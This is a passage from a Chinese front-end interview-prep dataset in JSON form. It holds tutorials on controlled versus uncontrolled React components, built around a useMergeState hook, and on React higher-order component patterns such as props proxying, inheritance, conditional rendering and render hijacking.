propsValue,\n    defaultValue,\n    onChange\n  } = props;\n\n  const [mergedValue, setValue] = useMergeState(new Date(), {\n    value: propsValue,\n    defaultValue\n  });\n\n  function changeValue(date: Date) {\n    if (propsValue === undefined) {\n      setValue(date);\n    }\n    onChange?.(date);\n  } \n\n  return <div>\n    {mergedValue?.toLocaleDateString()}\n    <div onClick={()=> {changeValue(new Date('2024-5-1'))}}>2023-5-1</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-2'))}}>2023-5-2</div>\n    <div onClick={()=> {changeValue(new Date('2024-5-3'))}}>2023-5-3</div>\n  </div>\n}\n```\n\n试试效果：\n\n非受控模式：\n\n![](https://static.ecool.fun//article/aea5af42-95cc-4041-8701-5d414e9e2799.)\n\n![](https://static.ecool.fun//article/1a2c6620-54b6-4d2d-91b1-dc4e9e1e614d.)\n\n受控模式：\n\n![](https://static.ecool.fun//article/9df2efad-ced7-4edb-83d3-80c06ba2b1b1.)\n\n![](https://static.ecool.fun//article/a9d30222-3a69-4a73-863d-5ee3db040b21.)\n\n再就是这个 onChange 部分，也应该封装进来：\n\n![](https://static.ecool.fun//article/58559c52-ee71-4462-9a43-ab211330072e.)\n\n不然用户用的时候还要想着去处理非受控组件的情况。\n\n我看 arco design 里是没封装进去：\n\n![](https://static.ecool.fun//article/7bc24689-b8de-4981-952e-efe8de95f826.)\n\n但是 ahooks 的 useControllableValue 就封装进去了：\n\n![](https://static.ecool.fun//article/6151fa09-3429-400d-b1a6-cfe930198980.)\n\n我们也加一下：\n\n```javascript\nimport {  SetStateAction, useCallback, useEffect, useRef, useState } from \"react\"\n\nfunction useMergeState<T>(\n  defaultStateValue: T,\n  props?: {\n    defaultValue?: T,\n    value?: T,\n    onChange?: (value: T) => void;\n  },\n): [T, React.Dispatch<React.SetStateAction<T>>,] {\n  const { defaultValue, value: propsValue, onChange } = props || {};\n\n  const isFirstRender = useRef(true);\n\n  const [stateValue, setStateValue] = useState<T>(() => {\n    if (propsValue !== undefined) {\n      return propsValue!;\n    } else if(defaultValue !== undefined){\n      return defaultValue!;\n    } else {\n      return defaultStateValue;\n    }\n  });\n\n  useEffect(() => {\n    if(propsValue === undefined && !isFirstRender.current) {\n      setStateValue(propsValue!);\n    }\n\n    isFirstRender.current = false;\n  }, [propsValue]);\n\n  const mergedValue = propsValue === undefined ? stateValue : propsValue;\n\n  function isFunction(value: unknown): value is Function {\n    return typeof value === 'function';\n  } \n\n  const setState = useCallback((value: SetStateAction<T>) => {\n    let res = isFunction(value) ? value(stateValue) : value\n\n    if (propsValue === undefined) {\n      setStateValue(res);\n    }\n    onChange?.(res);\n  }, [stateValue]);\n\n  return [mergedValue, setState]\n}\n\ninterface CalendarProps{\n  value?: Date;\n  defaultValue?: Date;\n  onChange?: (date: Date) => void;\n}\n\nfunction Calendar(props: CalendarProps) {\n  const {\n    value: propsValue,\n    defaultValue,\n    onChange\n  } = props;\n\n  const [mergedValue, setValue] = useMergeState(new Date(), {\n    value: propsValue,\n    defaultValue,\n    onChange\n  });\n\n  return <div>\n    {mergedValue?.toLocaleDateString()}\n    <div onClick={()=> {setValue(new Date('2024-5-1'))}}>2023-5-1</div>\n    <div onClick={()=> {setValue(new Date('2024-5-2'))}}>2023-5-2</div>\n    <div onClick={()=> {setValue(new Date('2024-5-3'))}}>2023-5-3</div>\n  </div>\n}\n\nfunction App() {\n  const [value, setValue] = useState(new Date('2024-5-1'));\n\n  return <Calendar value={value} onChange={(date) => {\n    console.log(date.toLocaleDateString());\n    setValue(date);\n  }}/>\n  // return <Calendar defaultValue={new Date('2024-5-1')} onChange={(date) => {\n  //   console.log(date.toLocaleDateString());\n  // }}/>\n}\n\nexport default App\n```\n\n![](https://static.ecool.fun//article/62a78e47-2581-4a08-99e8-996870c932b1.)\n\n这里把 onChange 传入了，然后 setState 的时候拿到新的状态值，如果是非受控模式就 setStateValue，然后调用 onChange。\n\n这里要拿到之前的 value 值，考虑闭包陷阱的问题，所以用 useCallback 加上 stateValue 作为依赖来解决。\n\n用的时候就不用区分受控非受控了，直接 setState 就行：\n\n![](https://static.ecool.fun//article/5e7604b9-3b07-4de5-8179-1caecb252337.)\n\n试试效果：\n\n非受控模式：\n\n![](https://static.ecool.fun//article/33afbee2-a620-4e26-8143-a85a2ce2a572.)\n\n![](https://static.ecool.fun//article/aa3a3d93-8955-4898-a0b7-a85312b58f25.)\n\n受控模式：\n\n![](https://static.ecool.fun//article/b7eaecfa-85b2-406c-a5e6-8d5cb063aeae.)\n\n![](https://static.ecool.fun//article/c370d63b-986d-478e-8d66-8ab1b4d5266d.)\n\n完美！\n\n这样，我们的组件就同时支持了受控模式和非受控模式。\n\n## 总结\n\n涉及到用户输入的组件都要考虑用受控模式还是非受控模式。\n\n**value 由用户控制就是非受控模式，由代码控制就是受控模式**。\n\n非受控模式就是完全用户自己修改 value，我们只是设置个 defaultValue，可以通过 onChange 或者 ref 拿到表单值。\n\n受控模式是代码来控制 value，用户输入之后通过 onChange 拿到值然后 setValue，触发重新渲染。\n\n单独用的组件，绝大多数情况下，用非受控模式就好了，因为你只是想获取到用户的输入。\n\n受控模式只在需要对用户的输入做一些修改然后再设置到 value 的情况用，再就是实时同步表单值到父组件的时候，比如 Form。\n\n如果需要结合 Form 表单用，那是要支持受控模式，因为 Form 会通过 Store 来统一管理所有表单项。\n\n封装业务组件的话，用非受控模式或者受控都行。\n\n但是基础组件还是都要支持，也就是支持 defaultValue 和 value + onChange 两种参数，内部通过判断 value 是不是 undefined 来区分。\n\n写组件想同时支持受控和非受控，可以直接用 ahooks 的 useControllableValue，也可以自己实现。\n\narco design、ant design 等组件库都是这么做的，并且不约而同封装了 useMergedValue 的 hook，我们也封装了一个。\n\n理清受控模式和非受控模式的区别，在写组件的时候灵活选用或者都支持。",
    "testPoint": "1. **受控组件与非受控组件**：\n   - 请解释什么是受控组件和非受控组件，并给出它们的使用场景。\n   - 在React中，如何实现一个受控组件和一个非受控组件？\n\n2. **表单状态管理**：\n   - 在React中，通常如何管理表单的状态？\n   - 能否给出一个使用`useState` Hook管理表单状态的示例？\n\n1. **表单验证**：\n   - 请描述在React中实现表单验证的常见方法。\n   - 能否给出一个使用自定义Hook或第三方库（如Formik、Yup）进行表单验证的示例？\n\n2. **表单提交**：\n   - 在React中，如何优雅地处理表单提交事件？\n   - 能否展示一个包含表单验证和提交逻辑的完整表单组件示例？\n\n3. **性能优化**：\n   - 在处理大型表单或频繁更新的表单时，有哪些性能优化的技巧？\n   - 如何避免不必要的重新渲染和性能瓶颈？\n",
    "exerciseKeyList": "[\"b7edb0a3-10d1-4857-907b-cc99acaf3516\",\"d184edae-f95e-494b-8944-86e713028816\"]",
    "vipLimit": 1,
    "level": 1.5,
    "pointOrder": 1,
    "createAt": "2024-12-17T09:45:00.000Z",
    "updateAt": "2025-03-14T08:30:57.000Z",
    "$progressExercise": "",
    "$exerciseList": [
      {
        "exerciseKey": "b7edb0a3-10d1-4857-907b-cc99acaf3516",
        "title": "说说对受控组件和非受控组件的理解，以及应用场景？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-10-24T04:30:09.000Z",
        "updateAt": "2024-07-23T10:25:37.000Z"
      },
      {
        "exerciseKey": "d184edae-f95e-494b-8944-86e713028816",
        "title": "什么是受控组件？",
        "category": "QA",
        "vipLimit": 0,
        "createAt": "2021-07-04T10:45:54.000Z",
        "updateAt": "2024-08-10T17:04:55.000Z"
      }
    ]
  },
  "203": {
    "id": 203,
    "tagId": 13,
    "title": "高阶组件",
    "explanation": "# 一 前言\n\n`React`高阶组件(`HOC`)，对于很多`react`开发者来说并不陌生，它是灵活使用`react`组件的一种技巧，高阶组件本身不是组件，它是一个参数为组件，返回值也是一个组件的函数。\n\n高阶作用用于**强化组件，复用逻辑，提升渲染性能等**作用。高阶组件也并不是很难理解，其实接触过后还是蛮简单的，接下来将按照，**高阶组件理解？**，**高阶组件具体怎么使用？应用场景**， **高阶组件实践(源码级别)** 为突破口，带大家详细了解一下高阶组件。\n\n我们带着问题去开始今天的讨论：\n\n-   1 什么是高阶组件，它解决了什么问题？\n-   2 有几种高阶组件，它们优缺点是什么？\n-   3 如何写一个优秀高阶组件？\n-   4 `hoc`怎么处理静态属性，跨层级`ref`等问题？\n-   5 高阶组件怎么控制渲染，隔离渲染？\n-   6 高阶组件怎么监控原始组件的状态？\n-   ...\n\n> 高阶组件（HOC）是 React 中用于复用组件逻辑的一种高级技巧。HOC 自身不是 React API 的一部分，它是一种基于 React 的组合特性而形成的设计模式。\n\n![NAOTU.jpg](https://static.ecool.fun//article/830ad332-32ce-49f7-ba26-aa21ded92ff3.awebp)\n\n# 二 全方位看高阶组件\n\n## 1 几种包装强化组件的方式\n\n### ① mixin模式\n\n**原型图**\n\n![C32587B9-D0FB-46CA-9AF8-FE2DF49021E5.jpg](https://static.ecool.fun//article/1f51ee36-0cbc-4c94-8ce9-5c8076c2b0af.awebp)\n\n#### 老版本的`react-mixins`\n\n在`react`初期提供一种组合方法。通过`React.createClass`,加入`mixins`属性，具体用法和`vue` 中`mixins`相似。具体实现如下。\n\n```js\nconst customMixin = {\n  componentDidMount(){\n    console.log( '------componentDidMount------' )\n  },\n  say(){\n    console.log(this.state.name)\n  }\n}\n\nconst APP = React.createClass({\n  mixins: [ customMixin ],\n  getInitialState(){\n    return {\n      name:'alien'\n    }\n  },\n  render(){\n    const { name  } = this.state\n    return <div> hello ,world , my name is { name } </div>\n  }\n})\n\n```\n\n这种`mixins`只能存在`createClass`中，后来`React.createClass`连同`mixins`这种模式被废弃了。`mixins`会带来一些负面的影响。\n\n-   1 mixin引入了隐式依赖关系。\n-   2 不同mixins之间可能会有先后顺序甚至代码冲突覆盖的问题\n-   3 mixin代码会导致滚雪球式的复杂性\n\n#### 衍生方式\n\n`createClass`的废弃，不代表`mixin`模式退出`react`舞台，在有状态组件`class`，我们可以通过**原型链继承**来实现`mixins`。\n\n```js\nconst customMixin = {  /* 自定义 mixins */\n  componentDidMount(){\n    console.log( '------componentDidMount------' )\n  },\n  say(){\n    console.log(this.state.name)\n  }\n}\n\nfunction componentClassMixins(Component,mixin){ /* 继承 */\n  for(let key in mixin){\n    Component.prototype[key] = mixin[key]\n  }\n}\n\nclass Index extends React.Component{\n  constructor(){\n    super()\n    this.state={  name:'alien' }\n  }\n  render(){\n    return <div> hello,world\n      <button onClick={ this.say.bind(this) } > to say </button>\n    </div>\n  }\n}\ncomponentClassMixins(Index,customMixin)\n```\n\n### ②extends继承模式\n\n**原型图**\n\n![9F743F44-D7FD-4F81-805B-80E8D5A358DB.jpg](https://static.ecool.fun//article/8b381a2e-7fb0-4e72-b031-10009570c54c.awebp)\n\n在`class`组件盛行之后，我们可以通过继承的方式进一步的强化我们的组件。这种模式的好处在于，可以封装基础功能组件，然后根据需要去`extends`我们的基础组件，按需强化组件，但是值得注意的是，必须要对基础组件有足够的掌握，否则会造成一些列意想不到的情况发生。\n\n```js\nclass Base extends React.Component{\n  constructor(){\n    super()\n    this.state={\n      name:'alien'\n    }\n  }\n  say(){\n    console.log('base components')\n  }\n  render(){\n    return <div> hello,world <button onClick={ this.say.bind(this) } >点击</button>  </div>\n  }\n}\nclass Index extends Base{\n  componentDidMount(){\n    console.log( this.state.name )\n  }\n  say(){ /* 会覆盖基类中的 say  */\n    console.log('extends components')\n  }\n}\nexport default Index\n```\n\n### ③HOC模式\n\n**原型图**\n\n![4F67D3DC-3B06-4B05-A006-B653D736855B.jpg](https://static.ecool.fun//article/6684cff5-09e1-4ff6-b3bc-11d80e0f8543.awebp)\n\n`HOC`是我们本章主要的讲的内容，具体用法，我们接下来会慢慢道来，我们先简单尝试一个`HOC`。\n\n```js\nfunction HOC(Component) {\n  return class wrapComponent extends React.Component{\n     constructor(){\n       super()\n       this.state={\n         name:'alien'\n       }\n     }\n     render=()=><Component { ...this.props } { ...this.state } />\n  }\n}\n\n@HOC\nclass Index extends React.Component{\n  say(){\n    const { name } = this.props\n    console.log(name)\n  }\n  render(){\n    return <div> hello,world <button onClick={ this.say.bind(this) } >点击</button>  </div>\n  }\n}\n```\n\n### ④自定义hooks模式\n\n**原型图**\n\n![1956EF23-7BFA-4003-9902-4D444B329290.jpg](https://static.ecool.fun//article/f590b273-2455-4d9f-9c3a-dcbeafd8cb7d.awebp)\n\n`hooks`的诞生，一大部分原因是解决**无状态组件没有`state`**和**逻辑难以复用**问题。`hooks`可以将一段逻辑封装起来，做到开箱即用，我这里就不多讲了，接下来会出`react-hooks`原理的文章，完成`react-hooks`三部曲。感兴趣的同学可以看笔者的另外二篇文章，里面详细介绍了`react-hooks`复用代码逻辑的原则和方案。\n\n传送门：\n\n[玩转react-hooks,自定义hooks设计模式及其实战](https://juejin.cn/post/6890738145671938062 \"https://juejin.cn/post/6890738145671938062\")\n\n[react-hooks如何使用？](https://juejin.cn/post/6864438643727433741 \"https://juejin.cn/post/6864438643727433741\")\n\n## 2 高阶组件产生初衷\n\n组件是把`prop`渲染成`UI`,而高阶组件是将组件转换成另外一个组件，我们更应该注意的是，经过包装后的组件，获得了那些强化,节省多少逻辑，或是解决了原有组件的那些缺陷，这就是高阶组件的意义。我们先来思考一下高阶组件究竟解决了什么问题🤔🤔🤔？\n\n**① 复用逻辑**：高阶组件更像是一个加工`react`组件的工厂，批量对原有组件进行**加工**，**包装**处理。我们可以根据业务需求定制化专属的`HOC`,这样可以解决复用逻辑。\n\n**② 强化props**：这个是`HOC`最常用的用法之一，高阶组件返回的组件，可以劫持上一层传过来的`props`,然后混入新的`props`,来增强组件的功能。代表作`react-router`中的`withRouter`。\n\n**③ 赋能组件**：`HOC`有一项独特的特性，就是可以给被`HOC`包裹的业务组件，提供一些拓展功能，比如说**额外的生命周期，额外的事件**，但是这种`HOC`，可能需要和业务组件紧密结合。典型案例`react-keepalive-router`中的 `keepaliveLifeCycle`就是通过`HOC`方式，给业务组件增加了额外的生命周期。\n\n**④ 控制渲染**：劫持渲染是`hoc`一个特性，在`wrapComponent`包装组件中，可以对原来的组件，进行`条件渲染`，`节流渲染`，`懒加载`等功能，后面会详细讲解，典型代表做`react-redux`中`connect`和 `dva`中 `dynamic` 组件懒加载。\n\n我会针对高阶组件的初衷展开，详细介绍其原理已经用法。跟上我的思路，我们先来看一下，高阶组件**如何在我们的业务组件中使用的**。\n\n## 3 高阶组件使用和编写结构\n\n`HOC`使用指南是非常简单的，只需要将我们的组件进行包裹就可以了。\n\n### 使用：装饰器模式和函数包裹模式\n\n对于`class`声明的有状态组件，我们可以用装饰器模式，对类组件进行包装：\n\n```js\n@withStyles(styles)\n@withRouter\n@keepaliveLifeCycle\nclass Index extends React.Componen{\n    /* ... */\n}\n```\n\n**我们要注意一下包装顺序，越靠近`Index`组件的，就是越内层的`HOC`,离组件`Index`也就越近。**\n\n对于无状态组件(函数声明）我们可以这么写：\n\n```js\nfunction Index(){\n    /* .... */\n}\nexport default withStyles(styles)(withRouter( keepaliveLifeCycle(Index) )) \n```\n\n### 模型：嵌套HOC\n\n对于不需要传递参数的`HOC`，我们编写模型我们只需要嵌套一层就可以，比如`withRouter`,\n\n```js\nfunction withRouter(){\n    return class wrapComponent extends React.Component{\n        /* 编写逻辑 */\n    }\n}\n\n```\n\n对于需要参数的`HOC`，我们需要一层代理，如下：\n\n```js\nfunction connect (mapStateToProps){\n    /* 接受第一个参数 */\n    return function connectAdvance(wrapCompoent){\n        /* 接受组件 */\n        return class WrapComponent extends React.Component{  }\n    }\n}\n\n```\n\n我们看出两种`hoc`模型很简单，对于代理函数，可能有一层，可能有很多层，不过不要怕，无论多少层本质上都是一样的，我们只需要一层一层剥离开，分析结构，整个`hoc`结构和脉络就会清晰可见。吃透`hoc`也就易如反掌。\n\n## 4 两种不同的高阶组件\n\n常用的高阶组件有两种方式**正向的属性代理**和**反向的组件继承**，两者之前有一些共性和区别。接下具体介绍两者区别，在第三部分会详细介绍具体实现。\n\n### 正向属性代理\n\n所谓正向属性代理，就是用组件包裹一层代理组件，在代理组件上，我们可以做一些，对源组件的代理操作。在`fiber tree` 上，先`mounted`代理组件，然后才是我们的业务组件。我们可以理解为父子组件关系，父组件对子组件进行一系列强化操作。\n\n```js\nfunction HOC(WrapComponent){\n    return class Advance extends React.Component{\n       state={\n           name:'alien'\n       }\n       render(){\n           return <WrapComponent  { ...this.props } { ...this.state }  />\n       }\n    }\n}\n```\n\n#### 优点\n\n-   ① 正常属性代理可以和业务组件低耦合，零耦合，对于`条件渲染`和`props属性增强`,只负责控制子组件渲染和传递额外的`props`就可以，所以无须知道，业务组件做了些什么。所以正向属性代理，更适合做一些开源项目的`hoc`，目前开源的`HOC`基本都是通过这个模式实现的。\n-   ② 同样适用于`class`声明组件，和`function`声明的组件。\n-   ③ 可以完全隔离业务组件的渲染,相比反向继承，属性代理这种模式。可以完全控制业务组件渲染与否，可以避免`反向继承`带来一些副作用，比如生命周期的执行。\n-   ④ 可以嵌套使用，多个`hoc`是可以嵌套使用的，而且一般不会限制包装`HOC`的先后顺序。\n\n#### 缺点\n\n-   ① 一般无法直接获取业务组件的状态，如果想要获取，需要`ref`获取组件实例。\n    \n-   ② 无法直接继承静态属性。如果需要继承需要手动处理，或者引入第三方库。\n    \n\n**例子：**\n\n```js\nclass Index extends React.Component{\n  render(){\n    return <div> hello,world  </div>\n  }\n}\nIndex.say = function(){\n  console.log('my name is alien')\n}\nfunction HOC(Component) {\n  return class wrapComponent extends React.Component{\n     render(){\n       return <Component { ...this.props } { ...this.state } />\n     }\n  }\n}\nconst newIndex =  HOC(Index) \nconsole.log(newIndex.say)\n\n```\n\n**打印结果**\n\n![29B0DA43-A037-473C-AD76-6550A3849CE8.jpg](https://static.ecool.fun//article/5adea65d-ea68-47cc-82a0-12b5716ed0be.awebp)\n\n### 反向继承\n\n反向继承和属性代理有一定的区别，在于包装后的组件继承了业务组件本身，所以我们我无须在去实例化我们的业务组件。当前高阶组件就是继承后，加强型的业务组件。这种方式类似于组件的强化，所以你必要要知道当前\n\n```js\nclass Index extends React.Component{\n  render(){\n    return <div> hello,world  </div>\n  }\n}\nfunction HOC(Component){\n    return class wrapComponent extends Component{ /* 直接继承需要包装的组件 */\n\n    }\n}\nexport default HOC(Index) \n```\n\n#### 优点\n\n-   ① 方便获取组件内部状态，比如`state`，`props` ,生命周期,绑定的事件函数等\n-   ② `es6`继承可以良好继承静态属性。我们无须对静态属性和方法进行额外的处理。\n\n```js\nclass Index extends React.Component{\n  render(){\n    return <div> hello,world  </div>\n  }\n}\nIndex.say = function(){\n  console.log('my name is alien')\n}\nfunction HOC(Component) {\n  return class wrapComponent extends Component{\n  }\n}\nconst newIndex =  HOC(Index) \nconsole.log(newIndex.say)\n```\n\n**打印结果**\n\n![3618DB30-8D9F-445A-8A01-69076A0B1E1D.jpg](https://static.ecool.fun//article/49627270-fb86-406c-9829-7112b3119602.awebp)\n\n#### 缺点\n\n-   ① 无状态组件无法使用。\n-   ② 和被包装的组件强耦合，需要知道被包装的组件的内部状态，具体是做什么？\n-   ③ 如果多个反向继承`hoc`嵌套在一起，当前状态会覆盖上一个状态。这样带来的隐患是非常大的，比如说有多个`componentDidMount`，当前`componentDidMount`会覆盖上一个`componentDidMount`。这样副作用串联起来，影响很大。\n\n# 三 如何编写高阶组件\n\n接下来我们来看看，如何编写一个高阶组件，你可以参考如下的情景，去编写属于自己的`HOC`。\n\n## 1 强化props\n\n### ① 混入props\n\n这个是高阶组件最常用的功能，承接上层的`props`,在混入自己的`props`，来强化组件。\n\n**有状态组件(属性代理)**\n\n```js\nfunction classHOC(WrapComponent){\n    return class  Idex extends React.Component{\n        state={\n            name:'alien'\n        }\n        componentDidMount(){\n           console.log('HOC')\n        }\n        render(){\n            return <WrapComponent { ...this.props }  { ...this.state }   />\n        }\n    }\n}\nfunction Index(props){\n  const { name } = props\n  useEffect(()=>{\n     console.log( 'index' )\n  },[])\n  return <div>\n    hello,world , my name is { name }\n  </div>\n}\n\nexport default classHOC(Index)\n```\n\n**有状态组件(属性代理)**\n\n同样也适用与无状态组件。\n\n```js\nfunction functionHoc(WrapComponent){\n    return function Index(props){\n        const [ state , setState ] = useState({ name :'alien'  })       \n        return  <WrapComponent { ...props }  { ...state }   />\n    }\n}\n```\n\n**效果**\n\n![A6FC09B4-EAA0-4A5A-BA3A-F7F2A8407C75.jpg](https://static.ecool.fun//article/4c1bca20-97d0-458b-b892-8009ff677905.awebp)\n\n### ② 抽离state控制更新\n\n高阶组件可以将`HOC`的`state`的配合起来，控制业务组件的更新。这种用法在`react-redux`中`connect`高阶组件中用到过，用于处理来自`redux`中`state`更改，带来的订阅更新作用。\n\n我们将上述代码进行改造。\n\n```js\nfunction classHOC(WrapComponent){\n  return class  Idex extends React.Component{\n      constructor(){\n        super()\n        this.state={\n          name:'alien'\n        }\n      }\n      changeName(name){\n        this.setState({ name })\n      }\n      render(){\n          return <WrapComponent { ...this.props }  { ...this.state } changeName={this.changeName.bind(this)  }  />\n      }\n  }\n}\nfunction Index(props){\n  const [ value ,setValue ] = useState(null)\n  const { name ,changeName } = props\n  return <div>\n    <div>   hello,world , my name is { name }</div>\n    改变name <input onChange={ (e)=> setValue(e.target.value)  }  />\n    <button onClick={ ()=>  changeName(value) }  >确定</button>\n  </div>\n}\n\nexport default classHOC(Index)\n```\n\n**效果**\n\n![屏幕录制2021-03-13 下午6.gif](https://static.ecool.fun//article/2e03232c-6a50-4261-8d17-c3b18009c8f1.awebp)\n\n## 2 控制渲染\n\n控制渲染是高阶组件的一个很重要的特性，上边说到的两种高阶组件，都能完成对组件渲染的控制。具体实现还是有区别的，我们一起来探索一下。\n\n### 2.1 条件渲染\n\n#### ① 基础 ：动态渲染\n\n对于属性代理的高阶组件，虽然不能在内部操控渲染状态，但是可以在外层控制当前组件是否渲染，这种情况应用于，**权限隔离**，**懒加载** ，**延时加载**等场景。\n\n**实现一个动态挂载组件的HOC**\n\n```js\nfunction renderHOC(WrapComponent){\n  return class Index  extends React.Component{\n      constructor(props){\n        super(props)\n        this.state={ visible:true }  \n      }\n      setVisible(){\n         this.setState({ visible:!this.state.visible })\n      }\n      render(){\n         const {  visible } = this.state \n         return <div className=\"box\"  >\n           <button onClick={ this.setVisible.bind(this) } > 挂载组件 </button>\n           { visible ? <WrapComponent { ...this.props } setVisible={ this.setVisible.bind(this) }   />  : <div className=\"icon\" ><SyncOutlined spin  className=\"theicon\"  /></div> }\n         </div>\n      }\n  }\n}\n\nclass Index extends React.Component{\n  render(){\n    const { setVisible } = this.props\n    return <div className=\"box\" >\n        <p>hello,my name is alien</p>\n        <img  src='https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=294206908,2427609994&fm=26&gp=0.jpg'   /> \n        <button onClick={() => setVisible()}  > 卸载当前组件 </button>\n    </div>\n  }\n}\nexport default renderHOC(Index)\n```\n\n效果：\n\n![屏幕录制2021-03-13 下午9.gif](https://static.ecool.fun//article/4d7d9fbe-ca78-4bbc-8eb5-876c2d1b640f.awebp)\n\n#### ② 进阶 ：分片渲染\n\n是不是感觉不是很过瘾，为了让大家加强对`H\bOC`条件渲染的理解，我再做一个**分片渲染+懒加载**功能。为了让大家明白，我也是绞尽脑汁啊😂😂😂。\n\n**进阶：实现一个懒加载功能的HOC，可以实现组件的分片渲染,用于分片渲染页面，不至于一次渲染大量组件造成白屏效果**\n\n```js\nconst renderQueue = []\nlet isFirstrender = false\n\nconst tryRender = ()=>{\n  const render = renderQueue.shift()\n  if(!render) return\n  setTimeout(()=>{\n    render() /* 执行下一段渲染 */\n  },300)\n} \n/* HOC */\nfunction renderHOC(WrapComponent){\n    return function Index(props){\n      const [ isRender , setRender ] = useState(false)\n      useEffect(()=>{\n        renderQueue.push(()=>{  /* 放入待渲染队列中 */\n          setRender(true)\n        })\n        if(!isFirstrender) {\n          tryRender() /**/\n          isFirstrender = true\n        }\n      },[])\n      return isRender ? <WrapComponent tryRender={tryRender}  { ...props }  /> : <div className='box' ><div className=\"icon\" ><SyncOutlined   spin /></div></div>\n    }\n}\n/* 业务组件 */\nclass Index extends React.Component{\n  componentDidMount(){\n    const { name , tryRender} = this.props\n    /* 上一部分渲染完毕，进行下一部分渲染 */\n    tryRender()\n    console.log( name+'渲染')\n  }\n  render(){\n    return <div>\n        <img src=\"https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=294206908,2427609994&amp;fm=26&amp;gp=0.jpg\" />\n    </div>\n  }\n}\n/* 高阶组件包裹 */\nconst Item = renderHOC(Index)\n\nexport default () => {\n  return <React.Fragment>\n      <Item name=\"组件一\" />\n      <Item name=\"组件二\" />\n      <Item name=\"组件三\" />\n  </React.Fragment>\n}\n```\n\n**效果**\n\n![fenload.gif](https://static.ecool.fun//article/7fa7996d-d5c6-4b2a-aaae-e647714b5f7e.awebp)\n\n大致流程，初始化的时候，`HOC`中将渲染真正组件的渲染函数，放入`renderQueue`队列中，然后初始化渲染一次，接下来，每一个项目组件，完成 `didMounted` 状态后，会从队列中取出下一个渲染函数，渲染下一个组件, 一直到所有的渲染任务全部执行完毕，渲染队列清空，有效的进行分片的渲染，这种方式对海量数据展示，很奏效。\n\n用`HOC`实现了条件渲染-分片渲染的功能，实际条件渲染理解起来很容易，就是通过变量，控制是否挂载组件，从而满足项目本身需求，条件渲染可以演变成很多模式，我这里介绍了条件渲染的二种方式，希望大家能够理解精髓所在。\n\n#### ③ 进阶：异步组件(懒加载)\n\n不知道大家有没有用过`dva`,里面的`dynamic`就是应用`HOC`模式实现的组件异步加载，我这里简化了一下，提炼核心代码，如下：\n\n```js\n/* 路由懒加载HOC */\nexport default function AsyncRouter(loadRouter) {\n  return class Content extends React.Component {\n    state = {Component: null}\n    componentDidMount() {\n      if (this.state.Component) return\n      loadRouter()\n        .then(module => module.default)\n        .then(Component => this.setState({Component},\n         ))\n    }\n    render() {\n      const {Component} = this.state\n      return Component ? <Component {\n      ...this.props\n      }\n      /> : null\n    }\n  }\n}\n```\n\n使用\n\n```js\nconst Index = AsyncRouter(()=>import('../pages/index'))\n```\n\n`hoc`还可以配合其他`API`，做一下衍生的功能。如上配合`import`实现异步加载功能。`HOC`用起来非常灵活，\n\n#### ④ 反向继承 ： 渲染劫持\n\n**HOC反向继承模式，可以实现颗粒化的渲染劫持，也就是可以控制基类组件的`render`函数，还可以篡改props，或者是`children`，我们接下来看看，这种状态下，怎么使用高阶组件。**\n\n```js\n\nconst HOC = (WrapComponent) =>\n  class Index  extends WrapComponent {\n    render() {\n      if (this.props.visible) {\n        return super.render()\n      } else {\n        return <div>暂无数据</div>\n      }\n    }\n  }\n\n```\n\n#### ⑤ 反向继承：修改渲染树\n\n**修改渲染状态(劫持render替换子节点)**\n\n```js\nclass Index extends React.Component{\n  render(){\n    return <div>\n       <ul>\n         <li>react</li>\n         <li>vue</li>\n         <li>Angular</li>\n       </ul>\n    </div>\n  }\n}\n\nfunction HOC (Component){\n  return class Advance extends Component {\n    render() {\n      const element = super.render()\n      const otherProps = {\n        name:'alien'\n      }\n      /* 替换 Angular 元素节点 */\n      const appendElement = React.createElement('li' ,{} , `hello ,world , my name  is ${ otherProps.name }` )\n      const newchild =  React.Children.map(element.props.children.props.children,(child,index)=>{\n           if(index === 2) return appendElement\n           return  child\n      }) \n      return  React.cloneElement(element, element.props, newchild)\n    }\n  }\n}\nexport  default HOC(Index)\n\n```\n\n**效果**\n\n![40D6BF30-9B4C-4EC9-B089-1E757DAC15DF.jpg](https://static.ecool.fun//article/8c329574-3057-4749-9296-3236c569a726.awebp)\n\n我们用劫持渲染的方式，来操纵`super.render()`后的`React.element`元素，然后配合 `createElement` , `cloneElement` , `React.Children` 等 `api`,可以灵活操纵，真正的渲染`react.element`，可以说是偷天换日，不亦乐乎。\n\n### 2.2节流渲染\n\n`hoc`除了可以进行**条件渲染**，**渲染劫持**功能外，还可以进行节流渲染，也就是可以优化性能，具体怎么做，请跟上我的节奏往下看。\n\n#### ① 基础: 节流原理\n\n`hoc`可以配合`hooks`的`useMemo`等`API`配合使用，可以实现对业务组件的渲染控制，减少渲染次数，从而达到优化性能的效果。如下案例，我们期望当且仅当`num`改变的时候，渲染组件，但是不影响接收的`props`。我们应该这样写我们的`HOC`。\n\n```js\nfunction HOC (Component){\n     return function renderWrapComponent(props){\n       const { num } = props\n       const RenderElement = useMemo(() =>  <Component {...props}  /> ,[ num ])\n       return RenderElement\n     }\n}\nclass Index extends React.Component{\n  render(){\n     console.log(`当前组件是否渲染`,this.props)\n     return <div>hello,world, my name is alien </div>\n  }\n}\nconst IndexHoc = HOC(Index)\n\nexport default ()=> {\n    const [ num ,setNumber ] = useState(0)\n    const [ num1 ,setNumber1 ] = useState(0)\n    const [ num2 ,setNumber2 ] = useState(0)\n    return <div>\n        <IndexHoc  num={ num } num1={num1} num2={ num2 }  />\n        <button onClick={() => setNumber(num + 1) } >num++</button>\n        <button onClick={() => setNumber1(num1 + 1) } >num1++</button>\n        <button onClick={() => setNumber2(num2 + 1) } >num2++</button>\n    </div>\n}\n```\n\n**效果：**\n\n![rend1.gif](https://static.ecool.fun//article/50d2f1c1-6c41-4590-8c04-8b6e3ad4cddb.awebp)\n\n如图所示,当我们只有点击 `num++`时候，才重新渲染子组件，点击其他按钮，只是负责传递了`props`,达到了期望的效果。\n\n#### ② 进阶：定制化渲染流\n\n思考：🤔上述的案例只是介绍了原理，在实际项目中，是量化生产不了的，原因是，我们需要针对不同`props`变化，写不同的`HOC`组件，这样根本起不了`Hoc`真正的用途，也就是`HOC`产生的初衷。所以我们需要对上述`hoc`进行改造升级，是组件可以根据定制化方向，去渲染组件。也就是`Hoc`生成的时候，已经按照某种契约去执行渲染。\n\n```js\nfunction HOC (rule){\n     return function (Component){\n 